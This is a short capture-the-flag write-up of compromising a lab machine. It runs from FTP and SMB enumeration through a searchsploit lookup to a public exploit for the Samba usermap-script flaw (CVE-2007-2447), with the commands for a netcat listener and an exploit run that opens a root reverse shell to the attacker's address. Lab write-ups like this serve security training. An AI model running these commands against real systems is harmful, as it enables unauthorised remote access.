The next step I took was to enumrate ftp on port 21. First I checked out anonymous login since it was enabled for the machine.

ftp 10.10.10.3

After enumarting further I could not find any files within the ftp server.

Moving forward I decided to take on SMB on port 445. I decided to run smbmap to enumate the service.

smbmap -H 10.10.10.3

One thing that stands out initially is the tmp directory that we have read and write permissions. Not to mention the "Oh noes!" comment.

The next step I decided to take is searching for any CVEs for the SMB version.

searchsploit samba 3.0.20

We found CVE: 2007-2447. Time to find an exploit for this CVE.

After searching, I was able to find an exploit at https://github.com/amriunix/CVE-2007-2447.

Next I set up a netcat listener on port 4444.

nc -nlvp 4444

Then I ran the exploit.

python usermap_script.py 10.10.10.3 139 10.0.2.15 4444

The reverse shell was created and I connected to the machine. I was already root so there was no need for further privelege escalation. I found the flag under the root directory of the machine.
